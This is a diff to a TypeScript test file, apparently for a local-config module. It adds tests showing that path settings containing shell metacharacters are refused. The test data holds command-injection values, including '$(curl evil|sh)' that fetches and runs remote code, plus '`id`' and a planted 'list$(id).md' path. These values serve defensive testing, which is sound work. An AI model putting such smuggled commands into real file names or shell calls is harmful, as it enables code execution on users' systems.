@@ -12,6 +12,7 @@ import {
   getMachinePath,
   getMachinePathSource,
   getMachineRepoCache,
+  MACHINE_PATH_KEYS,
   setMachinePath,
   setMachineRepoCache,
 } from './local-config.js';
@@ -140,6 +141,31 @@ describe('getMachinePath / setMachinePath', () => {
 
     expect(getMachinePath('issueListPath', { issueListPath: list })).toBe(list);
     fs.rmSync(getLocalConfigPath(), { recursive: true });
+  });
+});
+
+describe('path values a shell would interpret (#1934)', () => {
+  const UNSAFE = ['$(curl evil|sh)', '`id`', '"', "'", '\\', ';', '|', '&', '<', '>', '\n', '\r', '\0'];
+  const cases = MACHINE_PATH_KEYS.flatMap((key) => UNSAFE.map((bad) => [key, bad] as const));
+
+  it.each(cases)('setMachinePath refuses %s containing %j and stores nothing', (key, bad) => {
+    expect(() => setMachinePath(key, `/tmp/list${bad}.md`)).toThrow(/a path may not contain/);
+    expect(fs.existsSync(getLocalConfigPath())).toBe(false);
+  });
+
+  it('accepts ordinary paths with spaces, dots, dashes and tildes', () => {
+    setMachinePath('issueListPath', '/Users/me/My Vault/oss-list_v2.md');
+    setMachinePath('skippedIssuesPath', '~/notes/skipped-issues.md');
+    expect(readStored()).toMatchObject({
+      issueListPath: { path: '/Users/me/My Vault/oss-list_v2.md' },
+      skippedIssuesPath: { path: '~/notes/skipped-issues.md' },
+    });
+  });
+
+  it('does not adopt a synced path with a shell metacharacter, even when the file exists here', () => {
+    const planted = existingFile('vault/list$(id).md');
+    expect(getMachinePath('issueListPath', { issueListPath: planted })).toBe(planted);
+    expect(fs.existsSync(getLocalConfigPath())).toBe(false);
   });
 });
 
